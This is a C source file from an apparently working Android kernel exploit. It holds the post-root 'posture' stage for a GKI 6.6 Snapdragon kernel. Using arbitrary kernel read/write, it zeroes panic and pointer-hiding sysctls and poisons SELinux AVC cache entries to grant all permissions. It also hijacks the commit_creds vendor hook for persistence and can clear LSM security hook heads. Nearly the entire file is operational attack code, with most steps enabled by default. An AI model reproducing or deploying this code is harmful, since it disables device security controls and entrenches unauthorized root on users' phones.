#include "common.h"

/* ============================================================================
 * posture.c — post-root kernel-state enhancements.
 *
 * Once the route finished and root is confirmed, these best-effort steps
 * repurpose writable kernel state. Addresses are resolved at runtime by the
 * root child reading /proc/kallsyms (kptr_restrict hides them from the uid-2000
 * parent) and published through root_shared->posture_syms[].
 *
 * Everything is gated by NEO11_* env vars and defaults to ON (set to 0 to
 * disable). posture_apply() runs the whole thing in a forked child so a fault
 * only kills the child, never the io daemon fork; panic_on_oops is zeroed
 * first so even a faulted write does not hard-reboot the device.
 *
 * Source-derived offsets (android_16.0_kernel_SM8750, GKI 6.6.56, RANDSTRUCT
 * off -> source order):
 *   - security_hook_heads.<NAME> = (idx-1)*16  (struct hlist_head)
 *     security_list_options.<NAME> = (idx-1)*8 (union member)
 *     with idx = 1-based index in include/linux/lsm_hook_defs.h.
 *   - struct security_hook_list { hlist_node list@0x0; hlist_head *head@0x10;
 *                                 union hook@0x18; }
 *   - avc_entry { ssid@0, tsid@4, tclass@8(u16), avd@0xc, xp_node@0x20 };
 *     avc_node { ae@0x0, list@0x28, rhead@0x38 }; av_decision.allowed@0xc.
 *     struct selinux_avc { threshold@0x0, avc_cache@0x8 } (avc.c, static).
 *   - tracepoint struct: key@0x08 (static_key.enabled@+0), funcs@0x48.
 * ========================================================================== */

#define POSTURE_SYM_MAX 10
enum {
  POSTURE_SYM_PANIC_ON_OOPS = 0,
  POSTURE_SYM_PANIC_ON_WARN,
  POSTURE_SYM_KPTR_RESTRICT,
  POSTURE_SYM_DMESG_RESTRICT,
  POSTURE_SYM_PERF_PARANOID,
  POSTURE_SYM_BPF_DISABLED,
  POSTURE_SYM_SECURITY_HOOK_HEADS,
  POSTURE_SYM_SELINUX_AVC,
  POSTURE_SYM_LINUX_BANNER,
  POSTURE_SYM_VH_COMMIT_CREDS,
};

static const char *const posture_sym_names[POSTURE_SYM_MAX] = {
  "panic_on_oops",
  "panic_on_warn",
  "kptr_restrict",
  "dmesg_restrict",
  "sysctl_perf_event_paranoid",
  "sysctl_unprivileged_bpf_disabled",
  "security_hook_heads",
  "selinux_avc",
  "linux_banner",
  "__tracepoint_android_rvh_commit_creds",
};

/* 1-based hook indexes from include/linux/lsm_hook_defs.h */
#define LSM_IDX_BINDER_TRANSACTION   3
#define LSM_IDX_PTRACE_ACCESS_CHECK  6
#define LSM_IDX_PTRACE_TRACEME       7
#define LSM_IDX_CAPABLE             10
#define LSM_IDX_SB_MOUNT            34
#define LSM_IDX_INODE_PERMISSION    68
#define LSM_IDX_FILE_PERMISSION     88
#define LSM_IDX_MMAP_FILE           94
#define LSM_IDX_FILE_OPEN          101
#define LSM_IDX_KERNEL_READ_FILE   115

#define HEADS_OFF(idx1) (((idx1) - 1) * 16ULL)

/* avc / tracepoint layout constants */
#define AVC_CACHE_SLOTS      512
#define AVC_SELINUX_AVC_CACHE_OFF  0x8
#define AVC_NODE_LIST_OFF          0x28   /* avc_node.list (hlist_head.first points here) */
#define AVC_NODE_AVD_ALLOWED_OFF   0xc
#define AVC_ENTRY_SSID_OFF         0x0
#define AVC_ENTRY_TSID_OFF         0x4
#define TRACEPOINT_KEY_OFF         0x08
#define TRACEPOINT_FUNCS_OFF       0x48
#define STATIC_KEY_ENABLED_OFF     0x00

int posture_resolve_kallsyms(struct root_shared *rs) {
  char line[512];
  int found = 0;
  FILE *f = fopen("/proc/kallsyms", "r");
  if (!f) {
    return 0;
  }

  while (fgets(line, sizeof(line), f)) {
    unsigned long long addr;
    char type;
    char name[256];
    if (sscanf(line, "%llx %c %255s", &addr, &type, name) != 3 || addr == 0) {
      continue;
    }
    for (int i = 0; i < POSTURE_SYM_MAX; i++) {
      if (rs->posture_syms[i] == 0 && strcmp(name, posture_sym_names[i]) == 0) {
        rs->posture_syms[i] = (uint64_t)addr;
        found++;
      }
    }
    if (found == POSTURE_SYM_MAX) {
      break;
    }
  }
  fclose(f);

  pr_info("posture kallsyms resolved=%d/10\n", found);
  for (int i = 0; i < POSTURE_SYM_MAX; i++) {
    pr_info("posture sym[%d] %s=%016llx\n", i, posture_sym_names[i],
            (unsigned long long)rs->posture_syms[i]);
  }
  return found;
}

/* Best-effort: flip sysctl files directly (works with plain root caps, no
 * kernel R/W needed). Called by the root child before it exits, and BEFORE the
 * kallsyms read: on this device kptr_restrict hides /proc/kallsyms addresses
 * (kptr_restrict=2, or CAP_SYSLOG not honored), so dropping it first is what
 * makes posture_resolve_kallsyms() see real addresses. */
void posture_child_prepare(void) {
  const char *paths[] = {
    "/proc/sys/kernel/panic_on_oops",
    "/proc/sys/kernel/panic_on_warn",
    "/proc/sys/kernel/kptr_restrict",
  };
  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
    int fd = open(paths[i], O_WRONLY | O_CLOEXEC);
    if (fd >= 0) {
      write(fd, "0", 1);
      close(fd);
    }
  }
}

static uintptr_t runtime_to_direct(uintptr_t runtime_addr) {
  if (kaslr_base == 0 || runtime_addr < kaslr_base) {
    return 0;
  }
  return P0_PAGE_OFFSET | ((runtime_addr - kaslr_base) + P0_KERNEL_PHYS_DELTA);
}

static int posture_write_u32(int fd, uint64_t addr, uint32_t value) {
  if (!addr || fd < 0) {
    return 0;
  }
  return kernel_write_data(fd, addr, &value, sizeof(value)) ==
         (ssize_t)sizeof(value);
}

static uint64_t posture_env_u64(const char *name, uint64_t def) {
  const char *arg = getenv(name);
  char *end = NULL;
  if (!arg || !*arg) {
    return def;
  }
  errno = 0;
  unsigned long long v = strtoull(arg, &end, 0);
  if (errno || !end || *end) {
    return def;
  }
  return (uint64_t)v;
}

/* 1) panic suppression — always. */
static void posture_panics(int fd, const uint64_t *S) {
  int oops = posture_write_u32(fd, S[POSTURE_SYM_PANIC_ON_OOPS], 0);
  int warn = posture_write_u32(fd, S[POSTURE_SYM_PANIC_ON_WARN], 0);
  pr_success("posture panic_on_oops=%d warn=%d\n", oops, warn);
}

/* 2) sysctl info/priv opens — default on. */
static void posture_open_sysctls(int fd, const uint64_t *S) {
  int kptr = posture_write_u32(fd, S[POSTURE_SYM_KPTR_RESTRICT], 0);
  int dmesg = posture_write_u32(fd, S[POSTURE_SYM_DMESG_RESTRICT], 0);
  int perf = posture_write_u32(fd, S[POSTURE_SYM_PERF_PARANOID], (uint32_t)-1);
  int bpf = posture_write_u32(fd, S[POSTURE_SYM_BPF_DISABLED], 0);
  pr_success("posture sysctls kptr=%d dmesg=%d perf=%d bpf=%d\n",
             kptr, dmesg, perf, bpf);
}

/* 3) rodata-region writability probe (default off). security_hook_heads is
 *    __ro_after_init, placed inside the kernel's RO_DATA region; both the image
 *    mapping and the linear alias are made read-only at boot (mark_rodata_ro +
 *    mark_linear_text_alias_ro from smp_cpus_done). On a hardened kernel this
 *    write faults, so it runs last and the child just dies (panic already 0). */
static void posture_linear_test(int fd, const uint64_t *S) {
  uintptr_t heads = (uintptr_t)S[POSTURE_SYM_SECURITY_HOOK_HEADS];
  if (!heads) {
    pr_info("posture linear probe: security_hook_heads unresolved\n");
    return;
  }
  uintptr_t direct = runtime_to_direct(heads) + HEADS_OFF(LSM_IDX_CAPABLE);
  if (!is_direct_ptr(direct)) {
    pr_info("posture linear probe: bad alias %016llx\n",
            (unsigned long long)direct);
    return;
  }
  unsigned char orig = 0, flipped, back;
  if (!pipe_phys_read_data(fd, direct, &orig, 1)) {
    pr_info("posture linear probe: read failed\n");
    return;
  }
  flipped = (unsigned char)(orig ^ 0x5a);
  if (!pipe_phys_write_data(fd, direct, &flipped, 1)) {
    pr_info("posture linear probe: write failed\n");
    return;
  }
  back = 0;
  int writable =
    pipe_phys_read_data(fd, direct, &back, 1) && back == flipped;
  /* restore regardless */
  pipe_phys_write_data(fd, direct, &orig, 1);
  pr_success("posture linear probe sec_hook_heads+0x%03llx direct=%016llx "
             "writable=%d\n",
             (unsigned long long)HEADS_OFF(LSM_IDX_CAPABLE),
             (unsigned long long)direct, writable);
}

/* 4) clear curated security_hook_heads (default off — see posture_run: the
 *    heads live in RO_DATA, protected in both mappings on this device, so the
 *    direct-map write faults and kills this child). */
static void posture_lsm_off(int fd, const uint64_t *S) {
  uintptr_t heads = (uintptr_t)S[POSTURE_SYM_SECURITY_HOOK_HEADS];
  if (!heads) {
    pr_warning("posture lsm_off: security_hook_heads unresolved\n");
    return;
  }
  uintptr_t direct = runtime_to_direct(heads);
  if (!is_direct_ptr(direct)) {
    pr_warning("posture lsm_off: bad alias %016llx\n",
               (unsigned long long)direct);
    return;
  }

  struct {
    int idx1;
    const char *name;
  } const hooks[] = {
    {LSM_IDX_CAPABLE, "capable"},
    {LSM_IDX_INODE_PERMISSION, "inode_permission"},
    {LSM_IDX_FILE_PERMISSION, "file_permission"},
    {LSM_IDX_BINDER_TRANSACTION, "binder_transaction"},
    {LSM_IDX_MMAP_FILE, "mmap_file"},
    {LSM_IDX_FILE_OPEN, "file_open"},
    {LSM_IDX_PTRACE_ACCESS_CHECK, "ptrace_access_check"},
    {LSM_IDX_PTRACE_TRACEME, "ptrace_traceme"},
    {LSM_IDX_KERNEL_READ_FILE, "kernel_read_file"},
    {LSM_IDX_SB_MOUNT, "sb_mount"},
  };
  for (size_t i = 0; i < sizeof(hooks) / sizeof(hooks[0]); i++) {
    uintptr_t slot = direct + HEADS_OFF(hooks[i].idx1);
    uint64_t before = pipe_read64(fd, slot);
    int ok = pipe_write64(fd, slot, 0);
    uint64_t after = pipe_read64(fd, slot);
    pr_info("posture lsm head %-22s off=0x%03llx %016llx->%016llx ok=%d\n",
            hooks[i].name, (unsigned long long)HEADS_OFF(hooks[i].idx1),
            (unsigned long long)before, (unsigned long long)after, ok);
  }
}

/* 5) poison the AVC cache entries of the current source SID (experimental,
 *    default off). allowed=0xffffffff for every cached (ssid=our sid) node. */
static void posture_avc_poison(int fd, const uint64_t *S) {
  uintptr_t avc = (uintptr_t)S[POSTURE_SYM_SELINUX_AVC];
  if (!avc) {
    pr_warning("posture avc: selinux_avc unresolved\n");
    return;
  }
  if (!kaslr_done) {
    return;
  }
  /* selinux_avc resolves to the image VA; the pipe primitives only take
   * direct-map addresses, so translate (same for the bss cache it embeds). */
  uintptr_t slots = runtime_to_direct(avc) + AVC_SELINUX_AVC_CACHE_OFF;
  if (!is_direct_ptr(slots)) {
    pr_warning("posture avc: bad slots alias %016llx\n",
               (unsigned long long)slots);
    return;
  }
  int poisoned = 0;
  for (int i = 0; i < AVC_CACHE_SLOTS; i++) {
    /* struct hlist_head is a single pointer (8 bytes) */
    uintptr_t head = slots + (uintptr_t)i * 8;
    uint64_t first = pipe_read64(fd, head);
    uintptr_t list = (uintptr_t)first;
    while (is_direct_ptr(list)) {
      /* hlist_head.first points at the node's embedded hlist_node (list), not
       * at the avc_node itself — recover the base with container_of. */
      uintptr_t node = list - AVC_NODE_LIST_OFF;
      if (!is_direct_ptr(node)) {
        break;
      }
      uint32_t ssid = pipe_read32(fd, node + AVC_ENTRY_SSID_OFF);
      uint32_t tsid = pipe_read32(fd, node + AVC_ENTRY_TSID_OFF);
      uintptr_t allowed = node + AVC_NODE_AVD_ALLOWED_OFF;
      uint32_t before = pipe_read32(fd, allowed);
      uint32_t after = before;
      /* defensive: only poison entries whose SIDs look real; avoids touching
       * whatever a corrupted list might otherwise lead us to */
      if (ssid < 0x10000u && tsid < 0x10000u) {
        uint32_t want = 0xffffffffu;
        int ok = pipe_phys_write_data(fd, allowed, &want, sizeof(want));
        after = pipe_read32(fd, allowed);
        if (ok && after == want) {
          poisoned++;
        }
      }
      pr_info("posture avc node=%016llx ssid=%u tsid=%u allowed=%08x->%08x\n",
              (unsigned long long)node, ssid, tsid, before, after);
      /* next node in the hlist: hlist_node.next */
      uint64_t next = pipe_read64(fd, list);
      if (!is_direct_ptr(next)) {
        break;
      }
      list = (uintptr_t)next;
    }
  }
  pr_success("posture avc poisoned=%d\n", poisoned);
}

/* 6) arm the android_rvh_commit_creds vendor-hook probe (experimental, default
 *    off). Points funcs[0].func at NEO11_VH_FUNC (a real KCFI-compatible
 *    function) and flips the static key. */
static void posture_arm_vh(int fd, const uint64_t *S) {
  uintptr_t tp = (uintptr_t)S[POSTURE_SYM_VH_COMMIT_CREDS];
  uint64_t target = posture_env_u64("NEO11_VH_FUNC", 0);
  if (!tp || !target) {
    pr_info("posture vh: skipped (set NEO11_VH_FUNC=<hex> to arm)\n");
    return;
  }
  uint64_t funcs = kernel_read64(fd, tp + TRACEPOINT_FUNCS_OFF);
  if (!is_kernel_ptr(funcs)) {
    pr_warning("posture vh: bad funcs=%016llx\n",
               (unsigned long long)funcs);
    return;
  }
  uint64_t before = kernel_read64(fd, (uintptr_t)funcs);
  int ok = kernel_write_data(fd, (uintptr_t)funcs, &target, sizeof(target)) ==
           (ssize_t)sizeof(target);
  uint64_t after = kernel_read64(fd, (uintptr_t)funcs);
  /* flip the static key so the fast path checks true */
  uintptr_t key = tp + TRACEPOINT_KEY_OFF;
  uint32_t one = 1;
  int key_ok =
    kernel_write_data(fd, key + STATIC_KEY_ENABLED_OFF, &one, sizeof(one)) ==
    (ssize_t)sizeof(one);
  pr_success("posture vh commit_creds funcs=%016llx func %016llx->%016llx "
             "ok=%d key=%d\n",
             (unsigned long long)funcs, (unsigned long long)before,
             (unsigned long long)after, ok, key_ok);
}

/* Ordered runner; runs in a forked child of the exploit. */
void posture_run(int fd) {
  struct root_shared *rs = root_shared;
  const uint64_t *S = rs ? rs->posture_syms : NULL;
  if (!S) {
    pr_warning("posture: no shared state\n");
    return;
  }

  posture_panics(fd, S);

  if (env_int_range("NEO11_OPEN_SYSCTLS", 1, 0, 1)) {
    posture_open_sysctls(fd, S);
  }

  /* AVC (kernel .bss) and vendor-hook arming (image-VA writes to .data plus a
   * heap funcs array) are writable on this device — default on. */
  if (env_int_range("NEO11_AVC_POISON", 1, 0, 1)) {
    posture_avc_poison(fd, S);
  }

  if (env_int_range("NEO11_VH_PERSIST", 1, 0, 1)) {
    posture_arm_vh(fd, S);
  }

  /* LSM_OFF and LINEAR_TEST both write security_hook_heads, which lives in the
   * kernel's RO_DATA region: read-only in the image mapping AND in the linear
   * alias (mark_rodata_ro + mark_linear_text_alias_ro at smp boot). The write
   * faults -> oops -> only this child dies (panic_on_oops is already 0), so
   * they are kept OFF by default and run last. Opt in to observe. */
  if (env_int_range("NEO11_LINEAR_TEST", 0, 0, 1)) {
    posture_linear_test(fd, S);
  }

  if (env_int_range("NEO11_LSM_OFF", 0, 0, 1)) {
    posture_lsm_off(fd, S);
  }

  pr_success("posture done\n");
}

/* Called from run_exploit after root; forks so a fault only kills the child. */
void posture_apply(void) {
  if (kernel_rw_fd < 0) {
    return;
  }
  pid_t pid = fork();
  if (pid == 0) {
    posture_run(kernel_rw_fd);
    _exit(0);
  }
  if (pid > 0) {
    pr_success("posture spawned pid=%d fd=%d\n", pid, kernel_rw_fd);
  }
}
